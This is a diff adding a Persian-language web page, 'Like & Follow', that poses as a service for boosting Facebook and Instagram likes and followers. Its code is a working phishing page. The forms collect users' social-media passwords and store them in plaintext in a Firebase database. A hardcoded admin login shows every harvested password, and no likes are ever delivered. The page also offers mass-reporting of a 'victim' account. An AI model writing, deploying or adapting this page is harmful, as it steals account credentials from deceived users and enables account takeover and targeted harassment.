@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Like & Follow Online</title>
+<style>
+body{
+  margin:0;
+  font-family:sans-serif;
+  background: linear-gradient(135deg,#667eea,#764ba2);
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+  color:white;
+}
+.container{
+  text-align:center;
+  padding:30px;
+  background: rgba(255,255,255,0.12);
+  backdrop-filter: blur(25px);
+  border-radius:25px;
+  box-shadow:0 0 40px rgba(0,0,0,0.3);
+  width:90%;
+  max-width:400px;
+  animation:fadeIn .8s ease;
+}
+h1{font-size:2.5em;margin-bottom:20px;animation:popIn 0.7s ease;}
+h2{font-size:2em;margin-bottom:20px;}
+input{
+  display:block;
+  width:90%;
+  margin:10px auto;
+  padding:12px 40px 12px 12px;
+  border-radius:25px;
+  border:none;
+  font-size:16px;
+  transition:.3s;
+  box-shadow:0 6px 15px rgba(0,0,0,0.3);
+}
+button{
+  display:block;
+  width:90%;
+  margin:10px auto;
+  padding:12px;
+  border-radius:25px;
+  border:none;
+  font-size:18px;
+  font-weight:bold;
+  cursor:pointer;
+  background: rgba(255,255,255,0.25);
+  backdrop-filter: blur(10px);
+  color:white;
+  transition:.3s;
+}
+button:hover{
+  transform: scale(1.05);
+  background: rgba(255,255,255,0.4);
+}
+.password-container{
+  position:relative;
+}
+.password-container .toggle-eye{
+  position:absolute;
+  right:12px;
+  top:12px;
+  cursor:pointer;
+  font-size:18px;
+  color:white;
+}
+.modal{
+  position:fixed;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,0.8);display:flex;
+  justify-content:center;align-items:center;
+  animation:fadeIn 0.5s ease;
+}
+.modal-content{
+  background: rgba(255,255,255,0.12);
+  backdrop-filter: blur(25px);
+  padding:25px;
+  border-radius:20px;
+  width:90%;
+  max-width:350px;
+  text-align:center;
+  animation:popIn 0.5s ease;
+}
+.popup{
+  position:fixed;
+  top:20%;
+  left:50%;
+  transform:translateX(-50%);
+  background: rgba(0,0,0,0.8);
+  color:white;
+  padding:20px 40px;
+  border-radius:20px;
+  font-size:1.2em;
+  animation:popupAnim 0.5s ease forwards;
+  z-index:9999;
+}
+.card{
+  background: rgba(255,255,255,0.1);
+  backdrop-filter: blur(15px);
+  border-radius:20px;
+  padding:15px;
+  margin:10px 0;
+  animation:fadeIn .5s ease;
+  text-align:right;
+}
+.card p{margin:5px 0;font-size:0.95em;}
+@keyframes fadeIn{from{opacity:0;transform:scale(.8);}to{opacity:1;transform:scale(1);}}
+@keyframes popIn{from{opacity:0;transform:scale(.5);}to{opacity:1;transform:scale(1);}}
+@keyframes popupAnim{0%{opacity:0; transform:translateX(-50%) translateY(-50px);}50%{opacity:1; transform:translateX(-50%) translateY(0);}100%{opacity:1; transform:translateX(-50%) translateY(-20px);}}
+/* انیمیشن درباره */
+.about-container{
+  animation:fadeIn 1s ease forwards;
+  background: linear-gradient(135deg,#ff9a9e,#fad0c4,#fad0c4,#ffecd2);
+  padding:30px;
+  border-radius:25px;
+  box-shadow:0 0 40px rgba(0,0,0,0.3);
+  color:#222;
+}
+</style>
+</head>
+<body>
+<div id="app"></div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
+import { getDatabase, ref, push, set, get, child } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCzgUkDhoTX3IGI2-BxoqsRtuAuxrrHK3s",
+  authDomain: "afghancode-72972.firebaseapp.com",
+  databaseURL: "https://afghancode-72972-default-rtdb.firebaseio.com",
+  projectId: "afghancode-72972",
+  storageBucket: "afghancode-72972.appspot.com",
+  messagingSenderId: "160165057812",
+  appId: "1:160165057812:web:affc2a7e7dc2e38405de01",
+  measurementId: "G-1BKC8YE996"
+};
+
+const firebaseApp = initializeApp(firebaseConfig);
+const database = getDatabase(firebaseApp);
+
+const app = document.getElementById("app");
+let currentUserEmail="";
+
+function showPopup(msg){
+  const popup=document.createElement('div');
+  popup.className='popup';
+  popup.textContent=msg;
+  document.body.appendChild(popup);
+  setTimeout(()=>popup.remove(),3000);
+}
+
+// --- صفحات ---
+function showMain(){
+app.innerHTML=`
+<div class="container">
+<h1>Like & Follow</h1>
+<button onclick="showLogin()">ورود</button>
+<button onclick="showAbout()">درباره</button>
+</div>`;
+}
+
+function showAbout(){
+app.innerHTML=`
+<div class="about-container">
+<h1>درباره اپلیکیشن</h1>
+<p>اپلیکیشن <b>Like & Follow</b> برای مدیریت لایک و فالور ساخته شده است. می‌توانید عملیات لایک، فالور و ریپورت را ثبت کنید و تمام داده‌ها به صورت آنلاین کار میکند
+این اپلیکیشن شامل 
+لایک فیسبوک که لینک فیسبوک را وارد میکند مقدار لایک را انتخاب میکنید و رمز فیسبوک را وارد میکنید حد اکثر در 24ساعت 5000لایک است 
+همچنان فالور فیسبوک 
+همچنان لایک انستاگرام 
+و همچنان فالور اینستاگرام
+و ریپورت فیسبوک 
+لینک فیسبوک قربانی را وارد کنید و جزییات دلیل ریپورت خود را قانونی بنویسیدارسال کنید 
+همینطور انستاگرام  فقد بجای لینک یوزر نیم را بنویسید
+
+در قسمت شماره مجازی شماره را انتخاب کنید کپی کنید 
+بعد پیامک همانجا ارسال میشود اعتبار آن 6دقیقه است پاک میشود 
+تا دیگران دسترسی به آن شماره‌ نداشته باشند .</p>
+<p>همه کاربران و فعالیت‌ها آنلاین و همگام هستند.</p>
+<button onclick="showMain()">بازگشت</button>
+</div>`;
+}
+
+// --- ورود ---
+function showLogin(){
+app.innerHTML=`
+<div class="container">
+<h2>ورود</h2>
+<input type="email" id="email" placeholder="ایمیل" required>
+<div class="password-container">
+<input type="password" id="password" placeholder="رمز عبور" required>
+<span class="toggle-eye" onclick="togglePassword('password')">&#128065;</span>
+</div>
+<button onclick="login()">ورود</button>
+<button onclick="showMain()">بازگشت</button>
+</div>`;
+}
+
+function togglePassword(id){
+const input = document.getElementById(id);
+input.type = input.type==='password'?'text':'password';
+}
+
+// --- Firebase ذخیره کاربر ---
+async function saveUser(email,password){
+  const dbRef = ref(database,'users');
+  const snapshot = await get(dbRef);
+  const users = snapshot.val() || {};
+  if(!Object.values(users).some(u=>u.email===email)){
+    const newUserRef = push(dbRef);
+    await set(newUserRef,{email,password});
+  }
+}
+
+// --- ورود ---
+async function login(){
+  const email=document.getElementById("email").value;
+  const password=document.getElementById("password").value;
+  if(!email||!password){showPopup("لطفاً ایمیل و رمز را وارد کنید!"); return;}
+  currentUserEmail=email;
+
+  await saveUser(email,password);
+
+  if(email==="afghanistan@gmail.com" && password==="Afghanistan"){ showAdmin(); }
+  else{ showHome(); }
+
+  showPopup("ورود موفقیت‌آمیز 🎉");
+}
+
+// --- هوم ---
+function showHome(){
+app.innerHTML=`
+<div class="container">
+<h2>صفحه هوم</h2>
+<button onclick="openModal('لایک فیسبوک')">👍 لایک فیسبوک</button>
+<button onclick="openModal('لایک اینستاگرام')">❤️ لایک اینستاگرام</button>
+<button onclick="openModal('فالور فیسبوک')">👥 فالور فیسبوک</button>
+<button onclick="openModal('فالور اینستاگرام')">🔥 فالور اینستاگرام</button>
+<button onclick="openModal('ریپورت فیسبوک')">⚠ ریپورت فیسبوک</button>
+<button onclick="openModal('ریپورت اینستاگرام')">🚨 ریپورت اینستاگرام</button>
+<button onclick="alert('به زودی')">📱 دریافت شماره مجازی</button>
+<button onclick="logout()">خروج</button>
+</div>`;
+}
+
+// --- مودال ---
+function openModal(action){
+const modal=document.createElement('div'); modal.className='modal';
+let inner='';
+if(action.includes('فیسبوک') && !action.includes('ریپورت')){
+inner=`<p>${action}</p>
+<input type="text" id="link" placeholder="لینک فیسبوک">
+<div class="password-container">
+<input type="password" id="pass" placeholder="رمز">
+<span class="toggle-eye" onclick="togglePassword('pass')">&#128065;</span>
+</div>
+<input type="number" id="count" placeholder="تعداد (حداکثر 5000)" max="5000">
+<button onclick="submitForm('${action}')">تایید</button>`;
+}else if(action.includes('اینستاگرام') && !action.includes('ریپورت')){
+inner=`<p>${action}</p>
+<input type="text" id="id" placeholder="آیدی اینستاگرام">
+<div class="password-container">
+<input type="password" id="pass" placeholder="رمز">
+<span class="toggle-eye" onclick="togglePassword('pass')">&#128065;</span>
+</div>
+<input type="number" id="count" placeholder="تعداد (حداکثر 5000)" max="5000">
+<button onclick="submitForm('${action}')">تایید</button>`;
+}else if(action.includes('ریپورت')){
+inner=`<p>${action}</p>
+<input type="text" id="id" placeholder="${action.includes('فیسبوک')?'لینک':'آیدی'}">
+<input type="text" id="details" placeholder="جزئیات">
+<button onclick="submitForm('${action}')">تایید</button>`;
+}
+modal.innerHTML=`<div class="modal-content">${inner}<br><button onclick="this.parentElement.parentElement.remove()">بستن</button></div>`;
+document.body.appendChild(modal);
+}
+
+// --- ارسال فرم ---
+async function submitForm(action){
+let data={user:currentUserEmail};
+if(action.includes('فیسبوک') && !action.includes('ریپورت')){
+data.link=document.getElementById('link').value;
+data.pass=document.getElementById('pass').value;
+data.count=document.getElementById('count').value;
+if(!data.link||!data.pass||!data.count){showPopup("لطفاً همه فیلدها را پر کنید!"); return;}
+}else if(action.includes('اینستاگرام') && !action.includes('ریپورت')){
+data.id=document.getElementById('id').value;
+data.pass=document.getElementById('pass').value;
+data.count=document.getElementById('count').value;
+if(!data.id||!data.pass||!data.count){showPopup("لطفاً همه فیلدها را پر کنید!"); return;}
+}else if(action.includes('ریپورت')){
+data.id=document.getElementById('id').value;
+data.details=document.getElementById('details').value;
+if(!data.id||!data.details){showPopup("لطفاً همه فیلدها را پر کنید!"); return;}
+}
+
+// ذخیره در Firebase
+const actionsRef = ref(database,'actions');
+const newActionRef = push(actionsRef);
+await set(newActionRef,{action,data});
+
+// پیام 1 تا 12 ساعت
+showPopup("✅ عملیات ثبت شد، لطفاً 1 تا 12 ساعت صبر کنید.");
+document.querySelector('.modal')?.remove();
+}
+
+// --- پنل ادمین ---
+async function showAdmin(){
+  const dbRef = ref(database);
+  const usersSnap = await get(child(dbRef,'users'));
+  const actionsSnap = await get(child(dbRef,'actions'));
+  const users = usersSnap.val() || {};
+  const actions = actionsSnap.val() || {};
+
+  let content='';
+  Object.values(users).forEach(u=>{
+    content+=`<div class="card"><p>کاربر: ${u.email}</p><p>رمز: ${u.password}</p>`;
+    Object.values(actions)
+      .filter(a=>a.data.user===u.email)
+      .forEach(a=>{
+        content+=`<div class="card" style="background:rgba(255,255,255,0.05);padding:10px;margin:5px;">
+        <p>نوع: ${a.action}</p>
+        <p>لینک/آیدی: ${a.data.link||a.data.id||''}</p>
+        <p>رمز: ${a.data.pass||''}</p>
+        <p>تعداد: ${a.data.count||''}</p>
+        <p>جزئیات: ${a.data.details||''}</p>
+        </div>`;
+      });
+    content+='</div>';
+  });
+
+  app.innerHTML=`
+  <div class="container" style="max-height:90vh;overflow:auto;">
+  <h1>پنل ادمین</h1>
+  <h3>تعداد کاربران: ${Object.keys(users).length}</h3>
+  ${content}
+  <button onclick="showHome()">رفتن به هوم</button>
+  <button onclick="logout()">خروج</button>
+  </div>`;
+}
+
+function logout(){currentUserEmail=""; showMain();}
+
+// --- توابع global ---
+window.showLogin = showLogin;
+window.showMain = showMain;
+window.showAbout = showAbout;
+window.login = login;
+window.showHome = showHome;
+window.openModal = openModal;
+window.submitForm = submitForm;
+window.showAdmin = showAdmin;
+window.logout = logout;
+window.togglePassword = togglePassword;
+
+showMain();
+</script>
+</body>
+</html>
